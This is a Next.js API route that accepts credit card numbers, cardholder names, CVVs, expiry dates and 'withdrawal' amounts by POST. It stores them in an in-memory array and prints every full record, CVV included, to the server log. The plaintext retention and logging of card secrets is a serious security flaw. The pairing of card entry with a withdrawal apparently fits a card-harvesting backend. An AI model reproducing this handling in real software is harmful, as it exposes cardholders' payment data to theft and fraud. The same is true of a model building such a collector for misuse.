import { NextApiRequest, NextApiResponse } from "next";

// In-memory storage for credit card details
const creditCardDetailsStore: Array<{
  creditCardNumber: string;
  cardholderName: string;
  cvv: string;
  expiryDate: string;
  withdrawAmount: string;
  withdrawCurrency: string;
  timestamp: string;
}> = [];

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    const { creditCardNumber, cardholderName, cvv, expiryDate, withdrawAmount, withdrawCurrency } = req.body;

    if (!creditCardNumber || !cardholderName || !cvv || !expiryDate || !withdrawAmount || !withdrawCurrency) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const data = {
      creditCardNumber,
      cardholderName,
      cvv,
      expiryDate,
      withdrawAmount,
      withdrawCurrency,
      timestamp: new Date().toISOString(),
    };

    try {
      // Store the details in memory
      creditCardDetailsStore.push(data);

      // Log the details in the backend logs
      console.log("Credit Card Details Stored:", data);

      res.status(200).json({ message: "Credit card details stored successfully" });
    } catch (error) {
      console.error("Error storing credit card details:", error);
      res.status(500).json({ error: "Failed to store credit card details" });
    }
  } else {
    res.setHeader("Allow", ["POST"]);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
